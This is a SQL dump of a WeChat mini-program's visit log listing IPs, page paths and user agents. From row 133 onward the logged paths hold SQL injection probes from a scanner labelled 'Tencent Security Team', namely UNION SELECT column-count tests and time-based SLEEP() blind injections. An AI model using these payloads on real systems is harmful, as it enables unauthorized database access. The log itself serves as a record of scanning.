INSERT INTO `visit_log` VALUES (95, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/88', 'mobile', '2025-09-01 17:36:53');
INSERT INTO `visit_log` VALUES (96, '39.163.100.200', '/pages/contact/contact', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-01 17:40:22');
INSERT INTO `visit_log` VALUES (97, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/90', 'mobile', '2025-09-01 17:42:04');
INSERT INTO `visit_log` VALUES (98, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'desktop', '2025-09-01 17:51:05');
INSERT INTO `visit_log` VALUES (99, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 18:04:03');
INSERT INTO `visit_log` VALUES (100, '39.163.100.200', '/pages/contact/contact', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 18:04:18');
INSERT INTO `visit_log` VALUES (101, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 18:09:35');
INSERT INTO `visit_log` VALUES (102, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/93', 'mobile', '2025-09-01 18:17:25');
INSERT INTO `visit_log` VALUES (103, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 18:32:15');
INSERT INTO `visit_log` VALUES (104, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 19:02:51');
INSERT INTO `visit_log` VALUES (105, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 19:12:46');
INSERT INTO `visit_log` VALUES (106, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 19:18:25');
INSERT INTO `visit_log` VALUES (107, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 19:23:27');
INSERT INTO `visit_log` VALUES (108, '127.0.0.1', '/pages/contact/contact', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 19:24:43');
INSERT INTO `visit_log` VALUES (109, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 19:32:32');
INSERT INTO `visit_log` VALUES (110, '127.0.0.1', '/pages/contact/contact', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 19:32:42');
INSERT INTO `visit_log` VALUES (111, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 20:05:01');
INSERT INTO `visit_log` VALUES (112, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/96', 'mobile', '2025-09-01 20:12:42');
INSERT INTO `visit_log` VALUES (113, '127.0.0.1', '/pages/index/index', 'http://localhost:5173/', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 20:26:35');
INSERT INTO `visit_log` VALUES (114, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 20:49:30');
INSERT INTO `visit_log` VALUES (115, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 21:36:50');
INSERT INTO `visit_log` VALUES (116, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 21:43:44');
INSERT INTO `visit_log` VALUES (117, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 21:57:08');
INSERT INTO `visit_log` VALUES (118, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 22:05:03');
INSERT INTO `visit_log` VALUES (119, '127.0.0.1', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 22:19:58');
INSERT INTO `visit_log` VALUES (120, '127.0.0.1', '/pages/index/index', 'http://localhost:5173/', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 22:25:22');
INSERT INTO `visit_log` VALUES (121, '127.0.0.1', '/pages/index/index', 'http://localhost:5173/', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 22:30:56');
INSERT INTO `visit_log` VALUES (122, '127.0.0.1', '/pages/index/index', 'http://localhost:5173/', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 22:39:26');
INSERT INTO `visit_log` VALUES (123, '127.0.0.1', '/pages/index/index', 'http://localhost:5173/', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'mobile', '2025-09-01 22:44:47');
INSERT INTO `visit_log` VALUES (124, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-01 23:03:15');
INSERT INTO `visit_log` VALUES (125, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.62(0x18003e38) NetType/WIFI Language/zh_CN', 'mobile', '2025-09-01 23:09:07');
INSERT INTO `visit_log` VALUES (126, '124.221.213.176', '/pages/index/index', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 00:31:24');
INSERT INTO `visit_log` VALUES (127, '101.34.86.201', '/pages/index/index', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 00:31:25');
INSERT INTO `visit_log` VALUES (128, '124.221.213.176', '/pages/contact/contact', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 00:31:36');
INSERT INTO `visit_log` VALUES (129, '101.34.86.201', '/pages/contact/contact', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/1000/Tencent Security Team', 'desktop', '2025-09-02 00:32:05');
INSERT INTO `visit_log` VALUES (130, '39.163.100.200', '/pages/index/index', '', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 wechatdevtools/1.06.2504010 MicroMessenger/8.0.5 Language/zh_CN webview/ sessionid/153', 'mobile', '2025-09-02 00:32:43');
INSERT INTO `visit_log` VALUES (131, '43.139.209.119', '/pages/index/index', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) f6a6', 'desktop', '2025-09-02 00:34:31');
INSERT INTO `visit_log` VALUES (132, '106.55.202.118', '/pages/index/index', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 19ab', 'desktop', '2025-09-02 00:34:32');
INSERT INTO `visit_log` VALUES (133, '43.139.209.119', '/pages/index/index\' union select 1-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:02');
INSERT INTO `visit_log` VALUES (134, '43.139.209.119', '/pages/index/index\' union select 1,2-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:02');
INSERT INTO `visit_log` VALUES (135, '43.139.209.119', '/pages/index/index\' union select 1,2,3-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:02');
INSERT INTO `visit_log` VALUES (136, '43.139.209.119', '/pages/index/index\' union select 1,2,3,4-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:02');
INSERT INTO `visit_log` VALUES (137, '43.139.209.119', '/pages/index/index\' union select 1,2,3,4,5-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:02');
INSERT INTO `visit_log` VALUES (138, '43.139.209.119', '/pages/index/index\' union select 1,2,3,4,5,6-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:02');
INSERT INTO `visit_log` VALUES (139, '43.139.209.119', '/pages/index/index\' union select 1,2,3,4,5,6,7-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:02');
INSERT INTO `visit_log` VALUES (140, '43.139.209.119', '/pages/index/index\' union select 1,2,3,4,5,6,7,8-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:02');
INSERT INTO `visit_log` VALUES (141, '43.139.209.119', '/pages/index/index\' union select 1,2,3,4,5,6,7,8,9-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:02');
INSERT INTO `visit_log` VALUES (142, '43.139.209.119', '/pages/index/index\' union select 1,2,3,4,5,6,7,8,9,10-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:02');
INSERT INTO `visit_log` VALUES (143, '43.139.209.119', '\' union select 1-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:04');
INSERT INTO `visit_log` VALUES (144, '43.139.209.119', '\' union select 1,2-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:04');
INSERT INTO `visit_log` VALUES (145, '43.139.209.119', '\' union select 1,2,3-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:04');
INSERT INTO `visit_log` VALUES (146, '43.139.209.119', '\' union select 1,2,3,4-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:04');
INSERT INTO `visit_log` VALUES (147, '43.139.209.119', '\' union select 1,2,3,4,5-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:05');
INSERT INTO `visit_log` VALUES (148, '43.139.209.119', '\' union select 1,2,3,4,5,6-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:05');
INSERT INTO `visit_log` VALUES (149, '43.139.209.119', '\' union select 1,2,3,4,5,6,7-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:05');
INSERT INTO `visit_log` VALUES (150, '43.139.209.119', '\' union select 1,2,3,4,5,6,7,8-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:05');
INSERT INTO `visit_log` VALUES (151, '43.139.209.119', '\' union select 1,2,3,4,5,6,7,8,9-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:05');
INSERT INTO `visit_log` VALUES (152, '43.139.209.119', '\' union select 1,2,3,4,5,6,7,8,9,10-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:05');
INSERT INTO `visit_log` VALUES (153, '43.139.209.119', '\" union select 1-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:47');
INSERT INTO `visit_log` VALUES (154, '43.139.209.119', '\" union select 1,2-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:47');
INSERT INTO `visit_log` VALUES (155, '43.139.209.119', '\" union select 1,2,3-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:47');
INSERT INTO `visit_log` VALUES (156, '43.139.209.119', '\" union select 1,2,3,4-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:47');
INSERT INTO `visit_log` VALUES (157, '43.139.209.119', '\" union select 1,2,3,4,5-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:47');
INSERT INTO `visit_log` VALUES (158, '43.139.209.119', '\" union select 1,2,3,4,5,6-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:47');
INSERT INTO `visit_log` VALUES (159, '43.139.209.119', '\" union select 1,2,3,4,5,6,7-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:47');
INSERT INTO `visit_log` VALUES (160, '43.139.209.119', '\" union select 1,2,3,4,5,6,7,8-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:47');
INSERT INTO `visit_log` VALUES (161, '43.139.209.119', '\" union select 1,2,3,4,5,6,7,8,9-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:47');
INSERT INTO `visit_log` VALUES (162, '43.139.209.119', '\" union select 1,2,3,4,5,6,7,8,9,10-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:47');
INSERT INTO `visit_log` VALUES (163, '43.139.209.119', '/pages/index/index\" union select 1-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:50');
INSERT INTO `visit_log` VALUES (164, '43.139.209.119', '/pages/index/index\" union select 1,2-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:50');
INSERT INTO `visit_log` VALUES (165, '43.139.209.119', '/pages/index/index\" union select 1,2,3-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:50');
INSERT INTO `visit_log` VALUES (166, '43.139.209.119', '/pages/index/index\" union select 1,2,3,4-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:50');
INSERT INTO `visit_log` VALUES (167, '43.139.209.119', '/pages/index/index\" union select 1,2,3,4,5-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:50');
INSERT INTO `visit_log` VALUES (168, '43.139.209.119', '/pages/index/index\" union select 1,2,3,4,5,6-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:50');
INSERT INTO `visit_log` VALUES (169, '43.139.209.119', '/pages/index/index\" union select 1,2,3,4,5,6,7-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:50');
INSERT INTO `visit_log` VALUES (170, '43.139.209.119', '/pages/index/index\" union select 1,2,3,4,5,6,7,8-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:53');
INSERT INTO `visit_log` VALUES (171, '43.139.209.119', '/pages/index/index\") OR (SELECT*FROM(SELECT(SLEEP(4)))qqfe) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:54');
INSERT INTO `visit_log` VALUES (172, '43.139.209.119', '\") OR (SELECT*FROM(SELECT(SLEEP(3)))qxct) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:54');
INSERT INTO `visit_log` VALUES (173, '43.139.209.119', '/pages/index/index\")) OR (SELECT*FROM(SELECT(SLEEP(3)))jzeh) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:56');
INSERT INTO `visit_log` VALUES (174, '43.139.209.119', '\")) OR (SELECT*FROM(SELECT(SLEEP(4)))tcis) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:56');
INSERT INTO `visit_log` VALUES (175, '43.139.209.119', '/pages/index/index\" OR (SELECT*FROM(SELECT(SLEEP(3)))ytig) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:57');
INSERT INTO `visit_log` VALUES (176, '43.139.209.119', '\" OR (SELECT*FROM(SELECT(SLEEP(3)))qoep) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:57');
INSERT INTO `visit_log` VALUES (177, '43.139.209.119', '/pages/index/index\')) OR (SELECT*FROM(SELECT(SLEEP(2)))yrow) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:58');
INSERT INTO `visit_log` VALUES (178, '43.139.209.119', '\')) OR (SELECT*FROM(SELECT(SLEEP(4)))kkfa) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:58');
INSERT INTO `visit_log` VALUES (179, '43.139.209.119', '/pages/index/index\" union select 1,2,3,4,5,6,7,8,9-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:59');
INSERT INTO `visit_log` VALUES (180, '43.139.209.119', '/pages/index/index\" union select 1,2,3,4,5,6,7,8,9,10-- ', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:35:59');
INSERT INTO `visit_log` VALUES (181, '43.139.209.119', '/pages/index/index\' OR (SELECT*FROM(SELECT(SLEEP(2)))anja) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:01');
INSERT INTO `visit_log` VALUES (182, '43.139.209.119', '\' OR (SELECT*FROM(SELECT(SLEEP(3)))sxfw) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:01');
INSERT INTO `visit_log` VALUES (183, '43.139.209.119', '/pages/index/index\') OR (SELECT*FROM(SELECT(SLEEP(3)))mcdt) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:02');
INSERT INTO `visit_log` VALUES (184, '43.139.209.119', '\') OR (SELECT*FROM(SELECT(SLEEP(3)))cxun) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:03');
INSERT INTO `visit_log` VALUES (185, '43.139.209.119', '/pages/index/index\")) AND (SELECT*FROM(SELECT(SLEEP(3)))jmdr) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:07');
INSERT INTO `visit_log` VALUES (186, '43.139.209.119', '\")) AND (SELECT*FROM(SELECT(SLEEP(3)))mwjj) limit 1#', '', 'Tencent Security Team, more information: https://developers.weixin.qq.com/community/minihome/doc/0008ea401c89c02cff2d1345051001 (68b5cab8024a1d857224a0090ad2) 72aa', 'desktop', '2025-09-02 00:36:07');
